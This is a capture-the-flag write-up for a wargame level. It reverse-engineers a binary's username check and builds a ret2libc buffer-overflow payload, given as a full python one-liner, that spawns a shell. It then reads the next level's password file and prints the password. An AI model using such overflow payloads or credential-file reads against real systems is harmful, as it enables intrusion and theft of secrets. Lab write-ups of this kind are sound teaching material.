In this exercice we have 2 functions other than main: verify_user_name() and verify_user_pass():

for verify_user_name, we can see that it compares the first 7 letters of the input with the str("dat_wil"): 

   0x08048478 <+20>:	mov    edx,0x804a040
   0x0804847d <+25>:	mov    eax,0x80486a8
   0x08048482 <+30>:	mov    ecx,0x7
   0x08048487 <+35>:	mov    esi,edx
   0x08048489 <+37>:	mov    edi,eax
   0x0804848b <+39>:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]

if this comparison goes through we get to enter the password then to verify_user_pass(), this function compares the first 5 letters with the str("admin"), but it will return incorrect password either way.

Since there is no hidden function or call system we will use a buffer overlow + ret2libc to get the flag, we will first test with the payload:
"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ" when running it in gdb we receive a segfault in 0x55555555 (U) :

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()

This means we can replace from the letter U and beyond with system()+4 bytes+"/bin/sh":

p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

find 0xf7e2c000,0xf7fcc000, "/bin/sh"
0xf7f897ec

so our final input will be as follows:

python -c 'print("dat_wil\n" + "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT" + "\xd0\xae\xe6\xf7" + "0000" + "\xec\x97\xf8\xf7c")' > payload; cat payload - | ./level01

cat /home/users/level02/.pass
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv